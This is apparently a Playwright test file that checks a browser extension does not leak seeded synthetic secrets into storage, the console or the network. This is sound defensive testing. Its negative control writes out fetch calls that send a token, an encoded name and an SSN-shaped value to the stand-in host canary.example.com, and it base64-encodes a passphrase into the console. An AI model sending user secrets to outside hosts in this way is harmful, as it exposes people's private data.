/**
 * @mandatory — Hard Rules 2 and 10: derived facts only; never log secrets.
 *
 * Every seeded secret (tests/fixtures/secrets/seeded.json) is injected into the fixture pages the
 * extension sees, and the Gmail and Calendar fixtures (VENDOR_PAGES, sprint_2 2.7) are opened as they are, with the
 * seeds in their own bodies, at the vendors' own addresses (./support/vendor-pages.ts), so the observers really read
 * them and real rows reach the ledger before the channels are searched. After a session, no seed value or canary fragment may appear in: the extension's
 * own ledger export, any IndexedDB database, any chrome.storage area, the extension origin's web storage
 * and CacheStorage, the web storage, IndexedDB or cookies of the pages it reads, console output from any
 * context, or any network URL or body (telemetry included, from Sprint 5). Later sprints extend the page
 * list with real vendor fixtures and add the share output; the channels stay. The negative control plants
 * a seed in each channel, some of them lightly transformed, and proves the collectors catch it. Never
 * skipped, retried, or weakened.
 */
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { expect, type Page, test, type Worker } from '@playwright/test';
import type { WxtBrowser } from 'wxt/browser';

import { startFixtureServer } from '../tools/serve-fixtures';
import {
  collectPageChannels,
  collectStorageChannels,
  type PageChannels,
  plantIndexedDbProbe,
  recordConsole,
  type StorageChannels,
} from './support/channels';
import { launchExtension } from './support/extension';
import { findLeaks, type Leak, loadSeeds, type Seed } from './support/leaks';
import { netLogPathFor, readNetLogRequests } from './support/netlog';
import { guardArgs, installRouteGuard, type RouteRecord } from './support/network-guard';
import { injectSeeds } from './support/seed-pages';
import {
  FIXTURE_TIME_ZONE,
  fixtureUrl,
  requestUrl,
  vendorFixture,
  waitForLedger,
} from './support/vendor-pages';

declare const chrome: WxtBrowser;

const SEEDS = loadSeeds();
const SEEDED_PAGES = ['_harness/blank.html', '_harness/mail-like.html', '_harness/calendar-like.html'];
const EXTENSION_PAGES = ['popup.html', 'options.html', 'sidepanel.html'];
/** Observer fixtures served as they are: each holds three seeds where real secrets sit (snippets, bodies, places). */
const VENDOR_PAGES = [
  vendorFixture('gmail', 'synthetic-sent-page-1.html'),
  vendorFixture('gmail', 'synthetic-receipt-amazon.html'),
  vendorFixture('gcal', 'synthetic-gcal-week-before.html'),
  // Real captures (2026-10-06): their seeds go through content script, bus, ledger and export too (QA-R5).
  vendorFixture('gmail', 'sent-list-1.html'),
  vendorFixture('gcal', 'week-after.html'),
];
const SETTLE_MS = 5_000;

interface Collected {
  readonly storage: StorageChannels;
  readonly pages: PageChannels;
  readonly consoleLines: readonly string[];
  readonly routeRecords: readonly RouteRecord[];
  readonly netLogUrls: readonly string[];
}

function allLeaks(collected: Collected, seeds: readonly Seed[]): Leak[] {
  return [
    ...findLeaks('ledger-export', collected.storage.ledgerExport, seeds),
    ...findLeaks('indexeddb', collected.storage.indexedDb, seeds),
    ...findLeaks('chrome-storage', collected.storage.storage, seeds),
    ...findLeaks('web-storage', collected.storage.webStorage, seeds),
    ...findLeaks('cache-storage', collected.storage.cacheStorage, seeds),
    ...findLeaks('page-storage', collected.pages.pageStorage, seeds),
    ...findLeaks('cookies', collected.pages.cookies, seeds),
    ...findLeaks('console', collected.consoleLines, seeds),
    ...findLeaks(
      'network',
      [...collected.netLogUrls, ...collected.routeRecords.map((r) => `${r.url} ${r.body}`)],
      seeds,
    ),
  ];
}

const seed = (id: string): Seed => {
  const found = SEEDS.find((s) => s.id === id);
  if (!found) throw new Error(`seed ${id} missing from seeded.json`);
  return found;
};

/** Runs `act` inside a guarded extension session and returns everything every channel holds. */
async function collectAfter(
  act: (ctx: {
    extension: Awaited<ReturnType<typeof launchExtension>>;
    seededUrl: (page: string) => string;
  }) => Promise<void>,
): Promise<Collected> {
  const server = await startFixtureServer();
  const dir = mkdtempSync(path.join(os.tmpdir(), 'attest-noleak-'));
  const routedFixtures = new Map<string, string>();
  const seededUrl = (page: string) => server.url(`_seeded/${page}`);
  for (const page of SEEDED_PAGES) {
    routedFixtures.set(
      seededUrl(page),
      injectSeeds(readFileSync(path.join(import.meta.dirname, '../fixtures/pages', page), 'utf8'), SEEDS),
    );
  }
  for (const fixture of VENDOR_PAGES) {
    routedFixtures.set(requestUrl(fixtureUrl(fixture)), readFileSync(fixture.htmlPath, 'utf8'));
  }
  const consoleLines: string[] = [];
  let storage: StorageChannels;
  let pages: PageChannels;
  let routeRecords: readonly RouteRecord[];
  // One NetLog per browser launch attempt; every one is searched (tests/e2e/support/extension.ts).
  const extension = await launchExtension({
    extraArgs: (attempt) => guardArgs(netLogPathFor(dir, attempt)),
    timezoneId: FIXTURE_TIME_ZONE,
  });
  try {
    // A live array: the guard appends every blocked request until the browser closes.
    routeRecords = await installRouteGuard(extension.context, {
      fixtureOrigin: server.origin,
      routedFixtures,
    });
    recordConsole(await extension.serviceWorker(), 'service-worker', consoleLines);
    extension.context.on('page', (page) => {
      recordConsole(page, page.url() || 'page', consoleLines);
    });
    await act({ extension, seededUrl });
    const probe = await extension.openExtensionPage('options.html');
    storage = await collectStorageChannels(probe, extension.context);
    pages = await collectPageChannels(extension.context);
  } finally {
    await extension.close();
    await server.close();
  }
  const netLogUrls = readNetLogRequests(dir).map((r) => r.url);
  rmSync(dir, { recursive: true, force: true });
  return { storage, pages, consoleLines, routeRecords, netLogUrls };
}

/**
 * Opens the Gmail and Calendar fixtures at their live addresses, checks their own seeds are on the page, and waits
 * until every observer stored rows from them: real data flowed before the channels are read.
 */
async function openVendorPages(extension: Awaited<ReturnType<typeof launchExtension>>): Promise<void> {
  for (const fixture of VENDOR_PAGES) {
    const tab = await extension.context.newPage();
    await tab.goto(fixtureUrl(fixture));
    for (const id of fixture.label.seededSecrets) {
      await expect(tab.locator(`[data-attest-seeded="${id}"]`).first()).toBeAttached();
    }
  }
  await waitForLedger(await extension.openExtensionPage('options.html'), (ledger) =>
    ['gmail.sent', 'gmail.receipt', 'gcal.event'].every((source) =>
      ledger.tables.observations.some((row) => row.source === source),
    ),
  );
}

/** The negative control's plants into the extension origin: chrome.storage, IndexedDB, web storage, caches. */
async function plantInExtension(page: Page): Promise<void> {
  await page.evaluate(([key, compact]) => chrome.storage.local.set({ probe: key, probe2: compact }), [
    seed('api_key_openai_shape').value,
    'GlacierMinnowTrumpet',
  ] as const);
  // Open the ledger through the export, then write a row behind its back.
  await page.evaluate(() =>
    chrome.runtime.sendMessage({ type: 'ui.query', query: { kind: 'ledger.export' } }),
  );
  await plantIndexedDbProbe(page, seed('person_name_1').value);
  await page.evaluate(
    ([local, session]) => {
      localStorage.setItem('probe', local);
      sessionStorage.setItem('probe', session);
    },
    [seed('token_lowercase').value, seed('passphrase_hyphenated').value] as const,
  );
  await page.evaluate(async (body) => {
    const cache = await caches.open('probe');
    await cache.put('https://probe.invalid/x', new Response(body));
  }, seed('email_body_1').value);
}

/** The negative control's plants into a page the extension reads: its web storage, IndexedDB and cookie. */
async function plantInPage(page: Page): Promise<void> {
  const values = ['phone_number', 'street_address', 'card_shape', 'email_local_part'].map(
    (id) => seed(id).value,
  );
  await page.evaluate(async ([local, session, idb, cookie]) => {
    localStorage.setItem('probe', local ?? '');
    sessionStorage.setItem('probe', session ?? '');
    document.cookie = `probe=${cookie ?? ''}`;
    await new Promise<void>((resolve, reject) => {
      const open = indexedDB.open('probe', 1);
      open.onupgradeneeded = () => open.result.createObjectStore('s');
      open.onsuccess = () => {
        const tx = open.result.transaction('s', 'readwrite');
        tx.objectStore('s').put(idb, 'k');
        tx.oncomplete = () => {
          open.result.close();
          resolve();
        };
      };
      open.onerror = () => {
        reject(new Error('page probe open failed'));
      };
    });
  }, values);
}

/** The negative control's plants into console output, from the service worker: one plain, one base64-encoded. */
async function plantInConsole(worker: Worker): Promise<void> {
  await worker.evaluate(
    ([body, phrase]) => {
      console.info(body);
      console.info(btoa(phrase));
    },
    [seed('email_body_2').value, seed('passphrase').value] as const,
  );
}

/**
 * The negative control's plants into the network, from an extension page: a token in a URL, a name
 * percent-encoded character by character, an SSN in a body.
 */
async function plantInNetwork(page: Page): Promise<void> {
  await page.evaluate(
    ([token, name, ssn]) => {
      const encoded = Array.from(name, (c) => `%${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
      return Promise.all([
        fetch(`https://canary.example.com/?q=${token}`).catch(() => undefined),
        fetch(`https://canary.example.com/?n=${encoded}`).catch(() => undefined),
        fetch('https://canary.example.com/', { method: 'POST', body: ssn }).catch(() => undefined),
      ]);
    },
    [seed('url_with_token').value, seed('person_name_2').value, seed('ssn_shape').value] as const,
  );
}

/** Every plant the negative control makes, as `channel:seedId`: the collectors must catch each one. */
const PLANTED = [
  'chrome-storage:api_key_openai_shape',
  'chrome-storage:passphrase',
  'indexeddb:person_name_1',
  'ledger-export:person_name_1',
  'web-storage:token_lowercase',
  'web-storage:passphrase_hyphenated',
  'cache-storage:email_body_1',
  'page-storage:phone_number',
  'page-storage:street_address',
  'page-storage:card_shape',
  'page-storage:email_local_part',
  'cookies:email_local_part',
  'console:email_body_2',
  'console:passphrase',
  'network:url_with_token',
  'network:person_name_2',
  'network:ssn_shape',
] as const;

test.describe('no seeded secret leaks', { tag: '@mandatory' }, () => {
  test('seeded pages leave no trace in export, IndexedDB, storage, console, or network', async () => {
    test.setTimeout(3 * 60_000);
    const collected = await collectAfter(async ({ extension, seededUrl }) => {
      for (const page of SEEDED_PAGES) {
        const tab = await extension.context.newPage();
        await tab.goto(seededUrl(page));
        // The seeds really are on the page the extension sees.
        await expect(tab.locator('[data-attest-seeded]')).toHaveCount(SEEDS.length);
      }
      await openVendorPages(extension);
      for (const page of EXTENSION_PAGES) await extension.openExtensionPage(page);
      await new Promise((resolve) => setTimeout(resolve, SETTLE_MS));
    });

    // Every channel was actually read: an unreadable channel must never pass as "no leaks".
    expect(collected.storage.ledgerExport).toMatchObject({
      type: 'ui.result',
      kind: 'ledger.export',
      ok: true,
    });
    expect(Object.keys(collected.storage.indexedDb)).toContain('attest');
    expect(collected.storage.storage).toHaveProperty('local');
    expect(Object.keys(collected.storage.webStorage).length).toBeGreaterThanOrEqual(EXTENSION_PAGES.length);
    expect(Object.keys(collected.pages.pageStorage)).toHaveLength(SEEDED_PAGES.length + VENDOR_PAGES.length);
    expect(collected.consoleLines.some((line) => line.startsWith('service-worker'))).toBe(true);

    const leaks = allLeaks(collected, SEEDS);
    for (const leak of leaks)
      console.log(`[no-leak] LEAK seed=${leak.seedId} channel=${leak.channel} at=${leak.location}`);
    expect(leaks).toEqual([]);
  });

  test('negative control: a seed planted in each channel is caught', async () => {
    test.setTimeout(2 * 60_000);
    const collected = await collectAfter(async ({ extension, seededUrl }) => {
      await plantInExtension(await extension.openExtensionPage('options.html'));
      const fixture = await extension.context.newPage();
      await fixture.goto(seededUrl('_harness/blank.html'));
      await plantInPage(fixture);
      await plantInConsole(await extension.serviceWorker());
      await plantInNetwork(await extension.openExtensionPage('options.html'));
    });
    const caught = new Set(allLeaks(collected, SEEDS).map((leak) => `${leak.channel}:${leak.seedId}`));
    for (const expected of PLANTED) {
      expect(caught, expected).toContain(expected);
    }
  });
});
